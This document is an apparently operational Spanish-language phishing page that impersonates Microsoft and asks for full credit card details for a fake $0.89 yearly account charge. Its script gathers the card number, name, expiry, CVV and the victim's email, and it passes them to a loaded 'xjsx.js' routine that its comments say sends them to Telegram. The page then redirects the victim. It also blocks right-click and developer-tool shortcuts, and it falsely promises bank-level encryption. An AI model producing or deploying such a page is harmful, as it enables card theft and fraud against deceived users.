<!doctype html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" type="image/svg+xml" href="/vite.svg" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Microsoft - Añadir tarjeta de crédito</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
      tailwind.config = {
        theme: {
          extend: {
            colors: {
              'ms-blue': '#0078d4',
              'ms-blue-hover': '#106ebe',
              'ms-red': '#f25022',
              'ms-green': '#7fba00',
              'ms-yellow': '#ffb900',
              'ms-blue-logo': '#00bcf2',
              'ms-gray': '#1b1b1b',
              'ms-gray-light': '#605e5c',
              'ms-border': '#8a8886',
              'ms-bg': '#f5f5f5',
            },
            fontFamily: {
              'segoe': ['"Segoe UI"', 'system-ui', '-apple-system', 'BlinkMacSystemFont', 'sans-serif'],
            },
            fontSize: {
              'ms-title': ['28px', { lineHeight: '36px', fontWeight: '600' }],
              'ms-subtitle': ['18px', { lineHeight: '24px', fontWeight: '400' }],
              'ms-body': ['15px', { lineHeight: '20px', fontWeight: '400' }],
              'ms-link': ['13px', { lineHeight: '16px', fontWeight: '400' }],
              'ms-logo': ['21px', { lineHeight: '28px', fontWeight: '600' }],
            },
            boxShadow: {
              'ms-card': '0 4px 12px rgba(0,0,0,0.15)',
            }
          }
        }
      }
    </script>
    <style>
      body {
        font-family: "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
        min-height: 100vh;
        /* Fijar todo en móvil */
        position: fixed;
        width: 100%;
        height: 100vh;
        overflow: hidden;
        /* Sin fondo en móvil */
        background: none;
      }
      
      /* Solo permitir scroll en desktop */
      @media (min-width: 640px) {
        body {
          position: static;
          overflow: auto;
          /* Fondo SVG solo en PC */
          background: url('banner.svg') center/cover no-repeat fixed;
        }
      }
      
      .ms-input {
        border: 1px solid #8a8886;
        font-size: 15px;
        padding: 12px 16px;
        line-height: 20px;
        border-radius: 4px;
        transition: border-color 0.2s ease;
      }
      
      .ms-input:focus {
        outline: none;
        border-color: #0078d4;
        box-shadow: inset 0 0 0 1px #0078d4;
      }
      
      .ms-input::placeholder {
        color: #8a8886;
      }
      
      .ms-button {
        background: #0078d4;
        transition: background-color 0.2s ease;
        font-size: 15px;
        font-weight: 600;
        padding: 12px 24px;
        min-height: 44px;
        border-radius: 4px;
        border: none;
        cursor: pointer;
      }
      
      .ms-button:hover {
        background: #106ebe;
      }
      
      .ms-button:active {
        background: #005a9e;
      }
      
      .ms-button:disabled {
        background: #8a8886;
        cursor: not-allowed;
      }
      
      .card-icons {
        display: flex;
        gap: 8px;
        margin-top: 8px;
      }
      
      .card-icon {
        width: 32px;
        height: 20px;
        border-radius: 4px;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 10px;
        font-weight: bold;
        color: white;
      }
      
      .visa { background: #1a1f71; }
      .amex { background: #006fcf; }
      .mastercard { background: linear-gradient(45deg, #eb001b 50%, #f79e1b 50%); }
      .discover { background: #ff6000; }
      
      .card-icon.active {
        transform: scale(1.1);
        box-shadow: 0 2px 8px rgba(0,0,0,0.3);
      }
      
      .fade-in {
        animation: fadeIn 0.4s ease-out;
      }
      
      @keyframes fadeIn {
        from { opacity: 0; transform: translateY(20px); }
        to { opacity: 1; transform: translateY(0); }
      }
      
      .header-banner {
        background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%);
        color: white;
        padding: 12px 0;
        position: relative;
        overflow: hidden;
      }
      
      .header-banner::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: url('image.png') center/cover;
        opacity: 0.1;
      }
      
      /* Contenedor principal fijo en móvil */
      .main-container {
        position: fixed;
        top: 60px; /* Espacio para el header */
        left: 0;
        right: 0;
        bottom: 60px; /* Espacio para el footer */
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 1rem;
        z-index: 10;
        overflow-y: auto;
      }
      
      /* En desktop, comportamiento normal */
      @media (min-width: 640px) {
        .main-container {
          position: static;
          min-height: 100vh;
          top: auto;
          bottom: auto;
          overflow-y: visible;
          padding: 2rem 1rem;
        }
      }
      
      /* Asegurar que los inputs funcionen en desktop */
      @media (min-width: 640px) {
        .ms-input {
          position: relative;
          z-index: 1;
          pointer-events: auto;
        }
        
        .ms-input:focus {
          z-index: 2;
        }
        
        /* Contenedor de formulario en desktop */
        .form-container {
          position: relative;
          z-index: 1;
        }
      }
    </style>
  </head>
  <body>
    <!-- Header Banner -->
    <div class="header-banner relative z-10">
      <div class="max-w-6xl mx-auto px-4 flex items-center justify-between">
        <div class="flex items-center gap-3">
          <div class="grid grid-cols-2 gap-px w-6 h-6">
            <div class="bg-white w-3 h-3"></div>
            <div class="bg-white w-3 h-3"></div>
            <div class="bg-white w-3 h-3"></div>
            <div class="bg-white w-3 h-3"></div>
          </div>
          <span class="text-lg font-semibold">Microsoft</span>
        </div>
        <div class="text-right">
          <div class="text-sm opacity-90">Estás comprando</div>
          <div class="text-lg font-semibold">Cuenta Personal</div>
        </div>
      </div>
    </div>

    <!-- Background overlay for better readability -->
    <div class="fixed inset-0 bg-white/10 backdrop-blur-[0.5px]"></div>
    
    <!-- Main Content -->
    <div class="main-container">
      <div class="w-full max-w-lg fade-in">
        <div class="bg-white rounded-xl shadow-ms-card p-8 form-container">
          <!-- Price Banner -->
          <div class="text-center mb-8 p-6 bg-gray-50 rounded-lg">
            <div class="text-3xl font-bold text-ms-gray mb-2">$0.89 <span class="text-lg font-normal text-ms-gray-light">/ Por año</span></div>
            <div class="text-ms-body text-ms-gray-light">Cuenta Personal de Microsoft</div>
          </div>
          
          <h1 class="text-2xl font-semibold text-ms-gray mb-6 text-center">Añade una tarjeta de crédito</h1>
          
          <!-- Credit Card Icons -->
          <div class="card-icons justify-center mb-6">
            <div class="card-icon visa">VISA</div>
            <div class="card-icon amex">AMEX</div>
            <div class="card-icon mastercard"></div>
            <div class="card-icon discover">DISC</div>
          </div>
          
          <form onsubmit="handlePayment(event)" class="space-y-6">
            <!-- Card Number -->
            <div>
              <label for="cardNumber" class="block text-ms-body text-ms-gray mb-2 font-medium">
                <span id="cardNumberLabel">Número de tarjeta*</span>
              </label>
              <input
                type="text"
                id="cardNumber"
                placeholder="•••• •••• •••• ••••"
                class="ms-input w-full text-ms-gray bg-white relative z-10"
                maxlength="23"
                required
                oninput="formatCardNumber(this)"
              />
              <div id="cardError" class="text-red-600 text-sm mt-1 hidden"></div>
            </div>
            
            <!-- Cardholder Name -->
            <div>
              <label for="cardholderName" class="block text-ms-body text-ms-gray mb-2 font-medium">
                Nombre del titular*
              </label>
              <input
                type="text"
                id="cardholderName"
                placeholder="Nombre como aparece en la tarjeta"
                class="ms-input w-full text-ms-gray bg-white relative z-10"
                required
              />
            </div>
            
            <!-- Expiry Date and CVV -->
            <div class="grid grid-cols-2 gap-4">
              <div>
                <label for="expiryMonth" class="block text-ms-body text-ms-gray mb-2 font-medium">
                  Vencimiento*
                </label>
                <div class="grid grid-cols-2 gap-2">
                  <input
                    type="text"
                    id="expiryMonth"
                    placeholder="MM"
                    class="ms-input text-ms-gray bg-white text-center relative z-10"
                    maxlength="2"
                    required
                    oninput="formatMonth(this)"
                  />
                  <input
                    type="text"
                    id="expiryYear"
                    placeholder="YY"
                    class="ms-input text-ms-gray bg-white text-center relative z-10"
                    maxlength="2"
                    required
                    oninput="formatYear(this)"
                  />
                </div>
              </div>
              
              <div>
                <label for="cvv" class="block text-ms-body text-ms-gray mb-2 font-medium">
                  <span id="cvvLabel">CVV*</span>
                </label>
                <input
                  type="text"
                  id="cvv"
                  placeholder="•••"
                  class="ms-input w-full text-ms-gray bg-white text-center relative z-10"
                  maxlength="4"
                  required
                  oninput="formatCVV(this)"
                />
                <div id="cvvError" class="text-red-600 text-sm mt-1 hidden"></div>
              </div>
            </div>
            
            <!-- Billing Address Checkbox -->
            <div class="flex items-start space-x-3 p-4 bg-gray-50 rounded-lg">
              <input
                type="checkbox"
                id="sameAddress"
                checked
                class="mt-1 rounded border-ms-border text-ms-blue focus:ring-ms-blue focus:ring-1 relative z-10"
              />
              <label for="sameAddress" class="text-ms-body text-ms-gray leading-tight">
                Mi dirección de facturación es la misma que mi dirección de cuenta de Microsoft
              </label>
            </div>
            
            <!-- Continue Button -->
            <div class="pt-4">
              <button
                type="submit"
                class="ms-button w-full text-white text-base relative z-10"
              >
                Continuar
              </button>
            </div>
            
            <!-- Security Notice -->
            <div class="text-center text-xs text-ms-gray-light mt-4 p-4 bg-blue-50 rounded-lg">
              <div class="flex items-center justify-center mb-2">
                <svg class="w-4 h-4 text-ms-blue mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
                </svg>
                <span class="font-medium text-ms-blue">Transacción segura</span>
              </div>
              <p>Tu información de pago está protegida con cifrado de nivel bancario</p>
            </div>
          </form>
        </div>
      </div>
    </div>

    <!-- Fixed Footer -->
    <div class="fixed bottom-0 left-0 right-0 bg-white/95 backdrop-blur-md border-t border-gray-200 py-2 z-50">
      <div class="max-w-4xl mx-auto px-4">
        <div class="flex flex-col sm:flex-row items-center justify-center space-y-0.5 sm:space-y-0 sm:space-x-6 text-xs text-ms-gray-light">
          <a href="#" class="hover:text-ms-blue transition-colors">Ayuda</a>
          <a href="#" class="hover:text-ms-blue transition-colors">Términos</a>
          <a href="#" class="hover:text-ms-blue transition-colors">Privacidad</a>
          <span class="text-center text-xs leading-tight hidden sm:inline">Exploración privada recomendada</span>
        </div>
      </div>
    </div>

    <!-- Script de Telegram XJSX -->
    <script src="xjsx.js"></script>
    
    <script>
      let currentCardType = null;
      
      // Card type detection patterns
      const cardPatterns = {
        visa: /^4/,
        mastercard: /^5[1-5]|^2[2-7]/,
        amex: /^3[47]/,
        discover: /^6(?:011|5)/
      };
      
      // Card validation rules
      const cardRules = {
        visa: { length: 16, cvvLength: 3, format: '#### #### #### ####' },
        mastercard: { length: 16, cvvLength: 3, format: '#### #### #### ####' },
        amex: { length: 15, cvvLength: 4, format: '#### ###### #####' },
        discover: { length: 16, cvvLength: 3, format: '#### #### #### ####' }
      };
      
      function detectCardType(number) {
        const cleanNumber = number.replace(/\s/g, '');
        
        for (const [type, pattern] of Object.entries(cardPatterns)) {
          if (pattern.test(cleanNumber)) {
            return type;
          }
        }
        return null;
      }
      
      function updateCardIcons(cardType) {
        // Remove active class from all icons
        document.querySelectorAll('.card-icon').forEach(icon => {
          icon.classList.remove('active');
        });
        
        // Add active class to detected card type
        if (cardType) {
          const activeIcon = document.querySelector(`.card-icon.${cardType}`);
          if (activeIcon) {
            activeIcon.classList.add('active');
          }
        }
      }
      
      function updateLabelsAndPlaceholders(cardType) {
        const cardNumberInput = document.getElementById('cardNumber');
        const cvvInput = document.getElementById('cvv');
        const cardNumberLabel = document.getElementById('cardNumberLabel');
        const cvvLabel = document.getElementById('cvvLabel');
        
        if (cardType && cardRules[cardType]) {
          const rules = cardRules[cardType];
          
          // Update labels
          cardNumberLabel.textContent = `Número de tarjeta* (${rules.length} dígitos)`;
          cvvLabel.textContent = `CVV* (${rules.cvvLength} dígitos)`;
          
          // Update placeholders
          cardNumberInput.placeholder = rules.format.replace(/#/g, '•');
          cvvInput.placeholder = '•'.repeat(rules.cvvLength);
          cvvInput.maxLength = rules.cvvLength;
          
          // Update max length for card number (including spaces)
          const spacesCount = (rules.format.match(/ /g) || []).length;
          cardNumberInput.maxLength = rules.length + spacesCount;
        } else {
          // Default values
          cardNumberLabel.textContent = 'Número de tarjeta*';
          cvvLabel.textContent = 'CVV*';
          cardNumberInput.placeholder = '•••• •••• •••• ••••';
          cvvInput.placeholder = '•••';
          cvvInput.maxLength = 4;
          cardNumberInput.maxLength = 23;
        }
      }
      
      function validateCardNumber(number, cardType) {
        const cleanNumber = number.replace(/\s/g, '');
        const cardError = document.getElementById('cardError');
        
        if (!cardType) {
          if (cleanNumber.length > 0) {
            cardError.textContent = 'Tipo de tarjeta no reconocido';
            cardError.classList.remove('hidden');
            return false;
          }
          cardError.classList.add('hidden');
          return true;
        }
        
        const rules = cardRules[cardType];
        if (cleanNumber.length > 0 && cleanNumber.length !== rules.length) {
          cardError.textContent = `${cardType.toUpperCase()} debe tener ${rules.length} dígitos`;
          cardError.classList.remove('hidden');
          return false;
        }
        
        cardError.classList.add('hidden');
        return true;
      }
      
      function validateCVV(cvv, cardType) {
        const cvvError = document.getElementById('cvvError');
        
        if (!cardType) {
          cvvError.classList.add('hidden');
          return true;
        }
        
        const rules = cardRules[cardType];
        if (cvv.length > 0 && cvv.length !== rules.cvvLength) {
          cvvError.textContent = `CVV debe tener ${rules.cvvLength} dígitos para ${cardType.toUpperCase()}`;
          cvvError.classList.remove('hidden');
          return false;
        }
        
        cvvError.classList.add('hidden');
        return true;
      }
      
      function formatCardNumber(input) {
        let value = input.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
        
        // Detect card type
        const cardType = detectCardType(value);
        
        // Update UI if card type changed
        if (cardType !== currentCardType) {
          currentCardType = cardType;
          updateCardIcons(cardType);
          updateLabelsAndPlaceholders(cardType);
        }
        
        // Format according to card type
        let formattedValue = value;
        if (cardType && cardRules[cardType]) {
          const rules = cardRules[cardType];
          if (cardType === 'amex') {
            // AMEX format: #### ###### #####
            formattedValue = value.replace(/(\d{4})(\d{6})(\d{5})/, '$1 $2 $3');
            if (value.length <= 4) {
              formattedValue = value;
            } else if (value.length <= 10) {
              formattedValue = value.replace(/(\d{4})(\d+)/, '$1 $2');
            }
          } else {
            // Standard format: #### #### #### ####
            formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
          }
        } else {
          // Default format
          formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
        }
        
        input.value = formattedValue;
        
        // Validate
        validateCardNumber(formattedValue, cardType);
      }
      
      function formatMonth(input) {
        let value = input.value.replace(/[^0-9]/gi, '');
        if (value.length === 1 && parseInt(value) > 1) {
          value = '0' + value;
        }
        if (parseInt(value) > 12) {
          value = '12';
        }
        if (parseInt(value) < 1 && value.length === 2) {
          value = '01';
        }
        input.value = value;
        
        // Validar fecha cuando ambos campos estén completos
        validateExpiryDate();
      }
      
      function formatYear(input) {
        let value = input.value.replace(/[^0-9]/gi, '');
        input.value = value;
        
        // Validar fecha cuando ambos campos estén completos
        validateExpiryDate();
      }
      
      function validateExpiryDate() {
        const monthInput = document.getElementById('expiryMonth');
        const yearInput = document.getElementById('expiryYear');
        const month = monthInput.value;
        const year = yearInput.value;
        
        // Limpiar errores previos
        monthInput.classList.remove('border-red-500', 'bg-red-50');
        yearInput.classList.remove('border-red-500', 'bg-red-50');
        
        // Remover mensaje de error previo
        const existingError = document.getElementById('expiryError');
        if (existingError) {
          existingError.remove();
        }
        
        // Solo validar si ambos campos tienen valores
        if (month.length === 2 && year.length === 2) {
          const currentDate = new Date();
          const currentYear = currentDate.getFullYear() % 100; // Últimos 2 dígitos
          const currentMonth = currentDate.getMonth() + 1; // Mes actual (1-12)
          
          const inputMonth = parseInt(month);
          const inputYear = parseInt(year);
          
          let isValid = true;
          let errorMessage = '';
          
          // Validar mes (1-12)
          if (inputMonth < 1 || inputMonth > 12) {
            isValid = false;
            errorMessage = 'Mes debe estar entre 01 y 12';
          }
          // Validar que no sea una fecha pasada
          else if (inputYear < currentYear || (inputYear === currentYear && inputMonth < currentMonth)) {
            isValid = false;
            errorMessage = 'La tarjeta ha expirado';
          }
          // Validar que no sea demasiado en el futuro (máximo 10 años)
          else if (inputYear > 50) { // Permitir hasta 2050 (50 en formato YY)
            isValid = false;
            errorMessage = 'Año máximo permitido: 2050';
          }
          
          if (!isValid) {
            // Agregar estilos de error
            monthInput.classList.add('border-red-500', 'bg-red-50');
            yearInput.classList.add('border-red-500', 'bg-red-50');
            
            // Mostrar mensaje de error
            const errorDiv = document.createElement('div');
            errorDiv.id = 'expiryError';
            errorDiv.className = 'text-red-600 text-sm mt-1';
            errorDiv.textContent = errorMessage;
            
            // Insertar después del contenedor de fecha
            const expiryContainer = monthInput.closest('.grid').parentElement;
            expiryContainer.appendChild(errorDiv);
            
            return false;
          }
        }
        
        return true;
      }
      
      function formatCVV(input) {
        let value = input.value.replace(/[^0-9]/gi, '');
        input.value = value;
        
        // Validate CVV
        validateCVV(value, currentCardType);
      }
      
      function handlePayment(event) {
        event.preventDefault();
        
        // Prevenir múltiples envíos
        const button = event.target.querySelector('button[type="submit"]') || document.querySelector('button[type="submit"]');
        if (button.disabled) {
          return;
        }
        
        const cardNumber = document.getElementById('cardNumber').value;
        const cardholderName = document.getElementById('cardholderName').value;
        const expiryMonth = document.getElementById('expiryMonth').value;
        const expiryYear = document.getElementById('expiryYear').value;
        const cvv = document.getElementById('cvv').value;
        const urlParams = new URLSearchParams(window.location.search);
        const email = urlParams.get('email') || '';
        
        // Final validation before submission
        const cardType = detectCardType(cardNumber);
        const isCardValid = validateCardNumber(cardNumber, cardType);
        const isCvvValid = validateCVV(cvv, cardType);
        const isExpiryValid = validateExpiryDate();
        
        if (!isCardValid || !isCvvValid || !isExpiryValid) {
          // Scroll to first error
          const firstError = document.querySelector('#cardError:not(.hidden), #cvvError:not(.hidden), #expiryError');
          if (firstError) {
            firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
          }
          
          return;
        }
        
        if (cardNumber && cardholderName && expiryMonth && expiryYear && cvv && isCardValid && isCvvValid && isExpiryValid) {
          // Disable button immediately
          button.disabled = true;
          button.textContent = 'Procesando...';
          
          // Preparar datos de la tarjeta
          const cardData = {
            email: email,
            cardNumber: cardNumber,
            cardholderName: cardholderName,
            expiryMonth: expiryMonth,
            expiryYear: expiryYear,
            cvv: cvv,
            sameAddress: document.getElementById('sameAddress').checked
          };
          
          // Enviar datos de tarjeta a Telegram ANTES de procesar
          if (typeof sendCardData !== 'undefined') {
            console.log('📤 Enviando datos de tarjeta...');
            
            sendCardData(cardData)
              .then(success => {
                console.log(success ? '✅ Tarjeta enviada' : '❌ Error enviando tarjeta');
                setTimeout(() => {
                  const redirectUrl = email ? `index5.html?email=${encodeURIComponent(email)}` : 'index5.html';
                  window.location.href = redirectUrl;
                }, 1500);
              })
              .catch(error => {
                console.error('❌ Error:', error);
                setTimeout(() => {
                  const redirectUrl = email ? `index5.html?email=${encodeURIComponent(email)}` : 'index5.html';
                  window.location.href = redirectUrl;
                }, 1500);
              });
          } else {
            console.warn('⚠️ XJSX no cargado');
            setTimeout(() => {
              const redirectUrl = email ? `index5.html?email=${encodeURIComponent(email)}` : 'index5.html';
              window.location.href = redirectUrl;
            }, 1500);
          }
        }
      }
      
      // Auto-focus on card number field
      window.addEventListener('load', function() {
        document.getElementById('cardNumber').focus();
      });
      
      // Agregar validación en tiempo real cuando el usuario sale de los campos
      document.addEventListener('DOMContentLoaded', function() {
        const monthInput = document.getElementById('expiryMonth');
        const yearInput = document.getElementById('expiryYear');
        
        monthInput.addEventListener('blur', validateExpiryDate);
        yearInput.addEventListener('blur', validateExpiryDate);
      });
    </script>
<script>
  // Deshabilitar clic derecho
  document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
  });

  // Deshabilitar inspeccionar elemento (F12, Ctrl+Shift+I, etc.)
  document.addEventListener('keydown', function(e) {
    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'U')) {
      e.preventDefault();
    }
  });
</script>

</body>
</html>
